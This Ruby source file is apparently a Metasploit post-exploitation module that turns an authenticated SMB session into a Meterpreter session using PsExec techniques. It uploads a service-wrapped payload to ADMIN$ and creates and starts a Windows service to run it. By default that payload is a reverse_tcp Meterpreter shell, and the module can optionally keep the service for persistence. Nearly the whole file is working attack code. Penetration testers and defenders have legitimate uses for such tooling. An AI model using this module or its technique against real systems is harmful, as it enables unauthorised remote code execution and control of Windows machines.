# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Exploit::EXE
  include Msf::Auxiliary::Report
  include Msf::Post::SessionUpgrade

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SMB to Meterpreter Upgrade via PsExec',
        'Description' => %q{
          Upgrades an authenticated SMB session to a Meterpreter session using PsExec techniques.
          This module uploads a service-wrapped executable payload to the ADMIN$ share via the
          existing authenticated SMB connection, then creates and starts a Windows service that
          executes the payload. This mirrors the approach used by exploit/windows/smb/psexec.
          Requires administrative privileges on the target.
        },
        'License' => MSF_LICENSE,
        'Author' => ['Dean Welch'],
        'Platform' => ['win'],
        'Arch' => [ARCH_X86, ARCH_X64],
        'SessionTypes' => ['smb'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptEnum.new('TARGET_ARCH', [true, 'Target architecture.', 'x64', ['x86', 'x64']])
      ]
    )

    register_advanced_options(
      [
        OptString.new('PAYLOAD_OVERRIDE', [false, 'Define the payload to use instead of the auto-selected meterpreter payload.']),
        OptString.new('SERVICE_NAME', [false, 'Custom service name (random if not set).']),
        OptString.new('SERVICE_DISPLAY_NAME', [false, 'Custom service display name.']),
        OptBool.new('SERVICE_PERSIST', [false, 'Do not delete the service after execution.', false]),
        OptString.new('SERVICE_FILENAME', [false, 'Filename for the uploaded payload (random if not set).'])
      ]
    )
  end

  def run
    return unless validate_session!

    datastore['PAYLOAD'] = datastore['PAYLOAD_OVERRIDE'].presence || select_payload
    run_upgrade
  end

  # Verifies the session can access ADMIN$ and bind to the SVCCTL pipe.
  def check
    return Exploit::CheckCode::Safe('Session is not valid') unless validate_session!

    target_host = session.client.dispatcher.tcp_socket.peerhost
    simple = session.simple_client

    # Verify ADMIN$ is writable
    share = admin_share_path(target_host)
    begin
      simple.connect(share)
      simple.disconnect(share)
    rescue RubySMB::Error::RubySMBError, Rex::Proto::SMB::Exceptions::Error => e
      return Exploit::CheckCode::Safe("Cannot access ADMIN$ share: #{e}")
    end

    # Verify SVCCTL pipe is accessible
    begin
      tree = session.client.tree_connect("\\\\#{target_host}\\IPC$")
      svcctl = tree.open_file(filename: 'svcctl', write: true, read: true)
      svcctl.bind(endpoint: RubySMB::Dcerpc::Svcctl)
      scm_handle = svcctl.open_sc_manager_w(target_host)
      svcctl.close_service_handle(scm_handle)
      Exploit::CheckCode::Appears('ADMIN$ is writable and SVCCTL pipe is accessible')
    rescue RubySMB::Dcerpc::Error::SvcctlError => e
      if e.message.include?('ERROR_ACCESS_DENIED')
        Exploit::CheckCode::Safe('Insufficient privileges to open Service Control Manager')
      else
        Exploit::CheckCode::Unknown("SVCCTL error: #{e}")
      end
    rescue RubySMB::Dcerpc::Error::BindError,
           RubySMB::Dcerpc::Error::FaultError,
           RubySMB::Dcerpc::Error::DcerpcError,
           RubySMB::Error::RubySMBError => e
      Exploit::CheckCode::Unknown("Cannot bind to SVCCTL pipe: #{e}")
    ensure
      tree.disconnect! if tree
    end
  end

  # Uploads a service EXE to ADMIN$ and creates a Windows service to execute it.
  def execute_upgrade(lhost)
    target_host = session.client.dispatcher.tcp_socket.peerhost
    simple = session.simple_client
    @service_filename = datastore['SERVICE_FILENAME'] || "#{Rex::Text.rand_text_alpha(8)}.exe"
    @target_host = target_host
    @simple = simple

    upload_payload_exe(simple, target_host, lhost)
    execute_service_via_svcctl(target_host)
  end

  private

  # Generates the service-wrapped EXE and writes it to \\target\ADMIN$\<filename>.
  def upload_payload_exe(simple, target_host, lhost)
    payload_data = generate_upgrade_payload(lhost, datastore['LPORT'], datastore['PAYLOAD'])
    if payload_data.nil?
      fail_with(Msf::Exploit::Failure::BadConfig, "Failed to generate payload #{datastore['PAYLOAD']}")
    end

    arch = datastore['TARGET_ARCH'] == 'x64' ? [ARCH_X64] : [ARCH_X86]
    opts = { code: payload_data, arch: arch, servicename: service_name }
    exe = Msf::Util::EXE.to_executable_fmt(framework, arch.first, 'win', payload_data, 'exe-service', opts)

    if exe.nil? || exe.empty?
      fail_with(Msf::Exploit::Failure::Unknown, 'Failed to generate service EXE payload')
    end

    share = admin_share_path(target_host)
    begin
      simple.connect(share)
    rescue RubySMB::Error::RubySMBError, Rex::Proto::SMB::Exceptions::Error => e
      fail_with(Msf::Exploit::Failure::Unreachable, "Failed to connect to ADMIN$ share: #{e}")
    end

    begin
      fd = simple.open("\\#{@service_filename}", 'rwct', 48000, read: true, write: true)
      fd << exe
      fd.close
      print_status("Uploaded payload to #{share}\\#{@service_filename}")
    rescue RubySMB::Error::RubySMBError, Rex::Proto::SMB::Exceptions::Error => e
      fail_with(Msf::Exploit::Failure::Unknown, "Failed to upload payload: #{e}")
    ensure
      simple.disconnect(share)
    end
  end

  # Connects to IPC$ via SVCCTL, creates a service pointing at the uploaded EXE, and starts it.
  def execute_service_via_svcctl(target_host)
    svc_handle = nil
    svcctl = nil
    scm_handle = nil

    begin
      tree = session.client.tree_connect("\\\\#{target_host}\\IPC$")
    rescue RubySMB::Error::RubySMBError, Rex::Proto::SMB::Exceptions::Error => e
      print_error("Failed to connect to IPC$ share: #{e}")
      return
    end

    begin
      svcctl = tree.open_file(filename: 'svcctl', write: true, read: true)
      svcctl.bind(endpoint: RubySMB::Dcerpc::Svcctl)
      vprint_status('Bound to \\svcctl')
    rescue RubySMB::Dcerpc::Error::BindError,
           RubySMB::Dcerpc::Error::FaultError,
           RubySMB::Dcerpc::Error::DcerpcError,
           RubySMB::Error::RubySMBError => e
      print_error("Failed to bind to SVCCTL pipe: #{e}")
      return
    end

    begin
      scm_handle = svcctl.open_sc_manager_w(target_host)
    rescue RubySMB::Dcerpc::Error::SvcctlError => e
      if e.message.include?('ERROR_ACCESS_DENIED')
        print_error('Insufficient privileges to open Service Control Manager. Administrative access is required.')
      else
        print_error("Failed to open Service Control Manager: #{e}")
      end
      return
    end

    display_name = datastore['SERVICE_DISPLAY_NAME'] || Rex::Text.rand_text_alpha(rand(8..16))
    # Service binary path points to the uploaded EXE in %SYSTEMROOT%
    bin_path = "%SYSTEMROOT%\\#{@service_filename}"

    begin
      vprint_status("Creating service #{service_name}...")
      svc_handle = svcctl.create_service_w(scm_handle, service_name, display_name, bin_path)
    rescue RubySMB::Dcerpc::Error::SvcctlError, RubySMB::Dcerpc::Error::FaultError => e
      print_error("Failed to create service: #{e}")
      return
    end

    begin
      vprint_status('Starting the service...')
      svcctl.start_service_w(svc_handle)
      print_good('Service started successfully')
    rescue RubySMB::Dcerpc::Error::SvcctlError => e
      # Timeout is expected — the service EXE spawns the payload then exits
      if e.message.include?('ERROR_SERVICE_REQUEST_TIMEOUT')
        vprint_status('Service start timed out, expected for payload execution')
      else
        print_error("Failed to start service: #{e}")
      end
    end
  ensure
    cleanup_service(svcctl, svc_handle, service_name) if svc_handle && svcctl
    begin
      svcctl&.close_service_handle(scm_handle) if scm_handle
    rescue RubySMB::Dcerpc::Error::SvcctlError, RubySMB::Error::RubySMBError
      vprint_warning("Could not close scm handle: #{e}")
    end
    cleanup_payload_file
  end

  # Removes the uploaded EXE from ADMIN$ unless SERVICE_PERSIST is set.
  def cleanup_payload_file
    return if datastore['SERVICE_PERSIST']
    return if @service_filename.nil? || @simple.nil? || @target_host.nil?

    share = admin_share_path(@target_host)
    begin
      @simple.connect(share)
      @simple.delete("\\#{@service_filename}")
      vprint_good("Deleted #{share}\\#{@service_filename}")
    rescue RubySMB::Error::RubySMBError, Rex::Proto::SMB::Exceptions::Error => e
      print_warning("Could not delete #{@service_filename} from ADMIN$. Manual removal may be required: #{e}")
    ensure
      begin
        @simple.disconnect(share)
      rescue RubySMB::Error::RubySMBError, Rex::Proto::SMB::Exceptions::Error
        nil
      end
    end
  end

  # Returns the service name, generating a random one if not configured.
  def service_name
    @service_name ||= datastore['SERVICE_NAME'].presence || Rex::Text.rand_text_alpha(rand(8..16))
  end

  # Returns the UNC path to the ADMIN$ share on the target.
  def admin_share_path(host)
    "\\\\#{host}\\ADMIN$"
  end

  # Selects the appropriate Meterpreter payload based on target architecture.
  def select_payload
    case datastore['TARGET_ARCH']
    when 'x64'
      'windows/x64/meterpreter/reverse_tcp'
    when 'x86'
      'windows/meterpreter/reverse_tcp'
    end
  end

  # Stops and deletes a Windows service created during execution.
  def cleanup_service(svcctl, svc_handle, svc_name)
    return if svcctl.nil? || svc_handle.nil?

    if datastore['SERVICE_PERSIST']
      vprint_status("SERVICE_PERSIST is set, skipping service deletion for '#{svc_name}'")
      begin
        svcctl.close_service_handle(svc_handle)
      rescue RubySMB::Dcerpc::Error::SvcctlError, RubySMB::Error::RubySMBError => e
        vprint_warning("Could not close service handle: #{e}")
      end
      return
    end

    begin
      svcctl.control_service(svc_handle, RubySMB::Dcerpc::Svcctl::SERVICE_CONTROL_STOP)
    rescue RubySMB::Dcerpc::Error::SvcctlError, RubySMB::Error::RubySMBError => e
      vprint_warning("Could not stop service '#{svc_name}': #{e}")
    end

    begin
      svcctl.delete_service(svc_handle)
      vprint_good("Service '#{svc_name}' deleted successfully")
    rescue RubySMB::Dcerpc::Error::SvcctlError, RubySMB::Error::RubySMBError => e
      print_warning("Could not delete service '#{svc_name}'. Manual removal may be required: #{e}")
    end

    begin
      svcctl.close_service_handle(svc_handle)
    rescue RubySMB::Dcerpc::Error::SvcctlError, RubySMB::Error::RubySMBError => e
      vprint_warning("Could not close service handle: #{e}")
    end
  end

  # Returns true if session is valid, false otherwise.
  def validate_session!
    begin
      session.client.dispatcher.tcp_socket.peerinfo
    rescue Errno::ENOTCONN, IOError, Rex::ConnectionError => e
      print_error("Session is not usable: #{e.message}")
      return false
    end

    unless session.type == 'smb'
      print_error("Invalid session type: #{session.type}. This module requires an SMB session.")
      return false
    end

    true
  end
end
